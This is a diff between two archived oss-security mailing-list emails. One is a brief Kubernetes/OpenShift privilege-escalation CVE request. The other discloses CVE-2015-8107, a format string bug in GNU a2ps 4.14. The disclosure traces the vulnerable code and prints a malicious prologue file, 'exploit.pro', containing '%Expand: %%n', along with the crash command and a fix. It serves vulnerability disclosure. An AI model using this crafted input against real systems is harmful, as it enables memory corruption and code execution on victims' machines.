@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["630" "Tuesday" "12" "January" "2016" "11:04:06" "-0700" "Kurt Seifried" "kseifried@redhat.com" "<CANO=Ty1Gis741iXUVrpYbBXi3S_4bNdTu7tbCb12Zz+5JVnPQg@mail.gmail.com>" "20" "[oss-security] CVE request for Kubernetes api server: build config to a strategy that isn't allowed by policy" "^Date:" nil nil "1" "2016011218:04:06" "[oss-security] CVE request for Kubernetes api server: build config to a strategy that isn't allowed by policy" (number mark "        kseifried@re Jan 12   20/630   " thread-indent "\"[oss-security] CVE request for Kubernetes api server: build config to a strategy that isn't allowed by policy\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["7310" "Monday" "16" "November" "2015" "19:24:18" "+0900" "=?UTF-8?B?6rmA7KKF6raM?=" "jgkim@ropas.snu.ac.kr" "<5649AED2.3060009@ropas.snu.ac.kr>" "279" "[oss-security] CVE-2015-8107 - a2ps(gnu) v4.14 format string vulnerability" "^Cc:" nil nil "11" "2015111610:24:18" "[oss-security] CVE-2015-8107 - a2ps(gnu) v4.14 format string vulnerability" (number mark "U       jgkim@ropas. Nov 16  279/7310  " thread-indent "\"[oss-security] CVE-2015-8107 - a2ps(gnu) v4.14 format string vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 19864 invoked by uid 550); 12 Jan 2016 18:04:18 -0000
+Received: (qmail 30141 invoked by uid 550); 16 Nov 2015 12:58:01 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,48 +11,296 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 19844 invoked from network); 12 Jan 2016 18:04:17 -0000
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
-         :content-type;
-        bh=OpNu5tNE70AcdQ4lIZoDtzWpX5KmK9iy2VZCtQrhavw=;
-        b=KEFEDHlAoL16LHBGxYEMGJxtWreBUUXvX4oq7Gp9d/winUiBuVhIxyM9zK1qcFRqeV
-         7beF8AQMxpd5TUgDV8Su51Rty6UJ/krU32poJBN+Vss4Fjgl8q2amCyVhlorYu1cBpOK
-         qJtNU6i9cMwJPYbjwIOagYGAjZr73FvORlxHnynVvuGchp2mLHFj/FUPCn+lG7AJOKDT
-         5zoZGHNWdP5AvbL4eKABPqxaBqwCrGSdMY1pZ+WFHYr4ZV8231cUEAEHoxV1h97tHT0T
-         9DRbzG5qtjogTKF2kGMv4XAseM9kdrAcH1kzaQLm7cITS7ZxZaroyUuUUC2CfZKz2r9b
-         Emdw==
-X-Gm-Message-State: ALoCoQnVrme5G4wb2nS3k86xcw5FmDIKBKwdK/HUcYJlZH4mVKIqv8n+AMfLO/bLSbP6Hj8/bftNJRyC+D+rxlhuAqLAVyufqR5Fs+kTl2SxKJp4VfMMjdE=
+Received: (qmail 18297 invoked from network); 16 Nov 2015 10:24:15 -0000
+Message-ID: <5649AED2.3060009@ropas.snu.ac.kr>
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101
+ Thunderbird/38.3.0
 MIME-Version: 1.0
-X-Received: by 10.129.39.2 with SMTP id n2mr89996869ywn.303.1452621846200;
- Tue, 12 Jan 2016 10:04:06 -0800 (PST)
-Message-ID: <CANO=Ty1Gis741iXUVrpYbBXi3S_4bNdTu7tbCb12Zz+5JVnPQg@mail.gmail.com>
-Content-Type: multipart/alternative; boundary=001a114096ea22fcae052926e15e
-Date: Tue, 12 Jan 2016 11:04:06 -0700
-From: Kurt Seifried <kseifried@redhat.com>
+Content-Type: multipart/alternative;
+ boundary="------------050405060707010207060802"
+Cc: wslee@ropas.snu.ac.kr
+Date: Mon, 16 Nov 2015 19:24:18 +0900
+From: =?UTF-8?B?6rmA7KKF6raM?= <jgkim@ropas.snu.ac.kr>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] CVE request for Kubernetes api server: build config to a strategy
- that isn't allowed by policy
-To: oss-security <oss-security@lists.openwall.com>, CVE ID Requests <cve-assign@mitre.org>
+Subject: [oss-security] CVE-2015-8107 - a2ps(gnu) v4.14 format string vulnerability
+To: oss-security@lists.openwall.com
 
---001a114096ea22fcae052926e15e
-Content-Type: text/plain; charset=UTF-8
+--------------050405060707010207060802
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
 
-CVE request (one is the problem, the other the fix):
+Dear List,
 
-https://github.com/openshift/origin/issues/6556
-https://github.com/openshift/origin/pull/6576
+I am writing this to report a format string vulnerability in a2ps. 
+(4.14, which is the latest version)
+Also I already have been assigned a CVE identifier from MITRE 
+"CVE-2015-8107", so I want to make public this vulnerability.
 
-You can modify a build so that it escalates privileges when built, you
-can't build it yourself (that fails) but if the imagestream trigger is used
-then it would build and you'd have escalated privileges.
+- Target Platform
+   Linux
+- Target Version
+   4.14 (Latest Version)
 
--- 
+- Vulnerability description
+When user runs a2ps with malicious crafted pro(a2ps prologue) file, an 
+attacker can execute arbitrary code.
+The function output_file processes the %Expand command in pro file.
+The variable `expansion' in the function output_file may hold a 
+malicious input string, which can be used as a format argument of vsprintf.
 
---
-Kurt Seifried -- Red Hat -- Product Security -- Cloud
-PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-Red Hat Product Security contact: secalert@redhat.com
+-- Step 1. (ouput.c 524 line)
 
---001a114096ea22fcae052926e15e--
+524     expansion = ((char *)
+                          expand_user_string (job, FIRST_FILE (job),
+                                (const uchar *) "Expand: requirement",
+                                (const uchar *) token));
+
+For instance, the variable expansion will point to the string “%n” when 
+a text line "%Expand: %%\n” exists in an input pro file.
+
+-- Step 2. (output.c 525 line)
+
+525    output (dest, expansion);
+
+output() is called in line 525, and the argument `expansion' is used as 
+a format string, which can be malicious, as we described in step 1.
+
+-- Step 3. (output.c 873 line)
+182    void output (struct output * out, const char *format, ...){
+      ...
+202   ds_unsafe_cat_vsprintf (out->chunk,format, args);
+      ...
+
+The variable format, which can be malicious, can be passed to 
+ds_unsafe_cat_vsprintf() in line 202.
+
+-- step 4. (dstring.c 321 line)
+321    void ds_unsafe_cat_vsprintf (struct dstring * ds, const char 
+*format, va_list args){
+       ...
+326    vsprintf (ds->content + ds->len, format, args);
+       ...
+
+The value of format, which can be malicious, is used as an argument of 
+vsprintf in line 326, therefore arbitrary code can be executed.
+
+-- Step 4. Our malicious input
+"exploit.pro"
+===================================
+% -*-postscript-*-
+% PostScript Prologue
+%
+% $Id: matrix.pro,v 1.1.1.1.2.1 2007/12/29 01:58:27 mhatta Exp $
+%
+
+%
+% This file is part of a2ps.
+%
+% This program is free software; you can redistribute it and/or modify
+% it under the terms of the GNU General Public License as published by
+% the Free Software Foundation; either version 3, or (at your option)
+% any later version.
+%
+% This program is distributed in the hope that it will be useful,
+% but WITHOUT ANY WARRANTY; without even the implied warranty of
+% MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+% GNU General Public License for more details.
+%
+% You should have received a copy of the GNU General Public License
+% along with this program; see the file COPYING.  If not, write to
+% the Free Software Foundation, 59 Temple Place - Suite 330,
+% Boston, MA 02111-1307, USA.
+%
+Documentation
+The layout is the same as samp(bw)samp, but alternating gray and white 
+lines.
+There are two macros defining the behavior:
+samp(pro.matrix.cycle)samp defines the length of the cycle (number of white
+and gray lines).  It defaults to 6.
+samp(pro.matrix.gray)samp defines the number of gray lines. Default is 3.
+EndDocumentation
+% -- code follows this line --
+%%IncludeResource: file base.ps
+%%IncludeResource: file a2ps.hdr
+%%BeginResource: procset a2ps-matrix-Prolog 2.0 1
+
+% Function T(ab), jumps to the n-th tabulation in the current line
+/T {
+  cw mul x0 add y0 moveto
+} bind def
+
+% Function n: move to the next line
+/n { %def
+  /y0 y0 bfs sub store
+  % Draw a grey background
+  /nline nline 1 add def
+% @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+% @@@@@@@@@@@@@@ Malicious user input @@@@@@@@@@@@@@@
+%Expand: %%n
+% @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+%Expand:  nline #{pro.matrix.cycle:-6} mod #{pro.matrix.gray:-3} ge {
+    gsave
+      newpath
+      x v get y0 currentfont /Descent get currentfontsize mul add moveto
+      pw 0 rlineto
+      0 bfs rlineto
+      pw neg 0 rlineto
+      closepath
+      0.9 setgray
+      fill
+    grestore
+  } if
+  x0 y0 moveto
+} bind def
+
+% Function N: show and move to the next line
+/N {
+  Show
+  n
+} bind def
+
+/S {
+  Show
+} bind def
+
+/p {
+  false UL
+  false BX
+%Face: Plain Courier bfs
+  Show
+} bind def
+
+/sy {
+  false UL
+  false BX
+%Face: Symbol Symbol bfs
+  Show
+} bind def
+
+/k {
+  false UL
+  false BX
+%Face: Keyword Courier-Oblique bfs
+  Show
+} bind def
+
+/K {
+  false UL
+  false BX
+%Face: Keyword_strong Courier-Bold bfs
+  Show
+} bind def
+
+/c {
+  false UL
+  false BX
+%Face: Comment Courier-Oblique bfs
+  Show
+} bind def
+
+/C {
+  false UL
+  false BX
+%Face: Comment_strong Courier-BoldOblique bfs
+  Show
+} bind def
+
+/l {
+  false UL
+  false BX
+%Face: Label Helvetica bfs
+  Show
+} bind def
+
+/L {
+  false UL
+  false BX
+%Face: Label_strong Helvetica-Bold bfs
+  Show
+} bind def
+
+/str{
+  false UL
+  false BX
+%Face: String Times-Roman bfs
+  Show
+} bind def
+
+/e{
+  false UL
+  true BX
+%Face: Error Helvetica-Bold bfs
+  Show
+} bind def
+
+%%EndResource
+%%BeginSetup
+% The font for line numbering
+/f# /Helvetica findfont bfs .6 mul scalefont def
+/nline 0 def
+%%EndSetup
+===================================
+
+Execute
+===================================
+~ $ a2ps --version
+GNU a2ps 4.14
+Written by Akim Demaille, Miguel Santana.
+
+Copyright (c) 1988-1993 Miguel Santana
+Copyright (c) 1995-2000 Akim Demaille, Miguel Santana
+Copyright (c) 2007- Akim Demaille, Miguel Santana and Masayuki Hatta
+This is free software; see the source for copying conditions. There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+
+~ $ a2ps --prologue=exploit test.tex -o test.ps
+aborted (core dumped)
+===================================
+
+- How to fix
+(output.c 525 line)
+525    output (dest, expansion); ===> output (dest, "%s", expansion);
+
+- How we found the vulnerability
+
+We used a static analyzer, Sparrow[1], to find the format string bug. 
+Our analyzer reported an alarm in a2ps dstring.c 326 line, So we looked 
+for a a2ps source code and found the bug.
+
+Sparrow is a state-of-the-art static analyzer that aims to verify the 
+absence of fatal bugs in C source. Sparrow is designed by Abstract 
+Interpretation and the analysis is sound in design. Sparrow adopts a 
+number of well-founded static analysis techniques[2,3] for scalability, 
+precision, and user convenience.
+
+References
+[1]: http://ropas.snu.ac.kr/sparrow/
+[2]: Selective Context-Sensitivity Guided by Impact Pre-Analysis. Hakjoo 
+Oh, Wonchan Lee, Kihong Heo, Hongseok Yang, and Kwangkeun Yi. PLDI'14.
+[3]: Design and Implementation of Sparse Global Analyses for C-like 
+Languages. Hakjoo Oh, Kihong Heo, Wonchan Lee, Woosuk Lee, and Kwangkeun 
+Yi. PLDI'12
+
+Sincerely, Woosuk Lee & Jong-Gwon Kim
+
+-----------------------------
+Woosuk Lee
+Ph.D. candidate
+ROPAS lab. (http://ropas.snu.ac.kr/)
+ROSAEC center (http://rosaec.snu.ac.kr/)
+Seoul National University
+(tel) +82-2-880-1865
+(email) wslee@ropas.snu.ac.kr
+-----------------------------
+-----------------------------
+Jong-Gwon Kim
+Graduate student
+ROPAS lab. (http://ropas.snu.ac.kr/)
+ROSAEC center (http://rosaec.snu.ac.kr/)
+Seoul National University
+(tel) +82-2-880-1865
+(email) jgkim@ropas.snu.ac.kr
+-----------------------------
+
+--------------050405060707010207060802--
